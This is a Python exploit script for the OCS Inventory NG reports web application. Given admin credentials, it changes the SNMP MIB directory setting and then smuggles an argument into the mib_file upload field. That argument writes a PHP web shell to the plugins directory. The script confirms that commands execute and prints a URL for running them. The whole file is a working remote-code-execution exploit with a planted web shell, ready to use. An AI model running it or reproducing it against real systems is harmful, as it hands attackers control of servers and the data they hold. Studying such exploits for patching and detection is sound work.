#!/usr/bin/env python
# @SakiiR

import sys
import requests
import string
import random
import base64
from bs4 import BeautifulSoup
from urllib.parse import quote as urlencode


proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

DEFAULT_CHARSET = string.hexdigits


def rand_str(length=32, charset=DEFAULT_CHARSET):
    r = ""
    for _ in range(length):
        r += charset[random.randint(0, len(charset) - 1)]
    return r


class OCS:
    def __init__(self, url):
        self.__url = url.strip("/")
        self.__session = requests.Session()
        self.__session.proxies.update(proxies)

    @staticmethod
    def find_csrf_front_content(content, form_id):
        ID = VALUE = None
        b = BeautifulSoup(content, "html.parser")
        forms = b.find_all("form")
        for form in forms:
            if form.get("id", "") == form_id:
                inputs = form.find_all("input")
                for i in inputs:
                    if "CSRF_" in i.get("id", ""):
                        ID = i.get("id")
                        VALUE = i.get("value")
        return ID, VALUE

    def authenticate(self, username, password):
        url = self.__url
        data = {"LOGIN": username, "PASSWD": password, "Valid_CNX": "Send"}
        r = self.__session.post(f"{url}/", data=data)
        return b"My dashboard" in r.content

    def set_snmp_mib_directory(self, value):
        url = f"{self.__url}/index.php?function=admin_conf"
        s = self.__session
        r = s.get(url)

        csrf_id, csrf_value = OCS.find_csrf_front_content(r.content, "modif_onglet")
        if not csrf_id or not csrf_value:
            raise "Cannot retrieve csrf token"

        data = {}
        data[csrf_id] = csrf_value
        data["onglet"] = "SNMP"
        data["old_onglet"] = "SNMP"
        data["SNMP"] = "0"
        data["SNMP_MIB_DIRECTORY"] = value
        data["RELOAD_CONF"] = ""
        data["Valid"] = "Update"

        r = s.post(url, data=data)

        return b"Update done" in r.content

    def upload_shell(self):
        url = f"{self.__url}/index.php?function=SNMP_config"
        s = self.__session
        r = s.get(url)

        csrf_id, csrf_value = OCS.find_csrf_front_content(r.content, "snmp_config")
        if not csrf_id or not csrf_value:
            raise "Cannot retrieve csrf token"

        data = {}

        basename = f"shell_{rand_str()}.php"
        payload = f"test -Lf /usr/share/ocsinventory-reports/ocsreports/plugins/{basename} -- <?=`$_GET[1]`?>"

        data["ocs[]"] = f"mib_file={urlencode(payload)}"
        data[csrf_id] = csrf_value
        data["onglet"] = "SNMP_MIB"
        data["old_onglet"] = "SNMP_MIB"
        # Dont pass mib_file ;) we gonna ad it on our own with ocs[]
        # data["mib_file"] = mib
        data["update_snmp"] = "Send"

        s.post(url.replace("index.php", "ajax.php"), data=data, files={"file": ""})

        flag = rand_str()

        shell_url = f"{self.__url}/plugins/{basename}"
        r = s.get(f"{shell_url}?1=echo -ne {flag}|base64")
        if base64.b64encode(flag.encode()) in r.content:
            return f"{shell_url}?1=id"


def main(argv):
    if len(argv) < 3:
        print(f"USAGE: {argv[0]} USERNAME:PASSWORD URL")
        print(f"e.g: {argv[0]} 'admin:admin' http://127.0.0.1/ocsreports")
        return 1

    username, password = argv[1].split(":")
    url = argv[2]

    ocs = OCS(url)

    if not ocs.authenticate(username, password):
        print("Failed to authenticate, check ur creds")
        return 1

    if not ocs.set_snmp_mib_directory("ANYVALUE"):
        print("Cannot update SNMP_MIB_DIRECTORY")
        return 1

    shell_url = ocs.upload_shell()
    if shell_url is None:
        print("Failed to upload shell")
        return 1

    print(f"Here is your shell: {shell_url}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
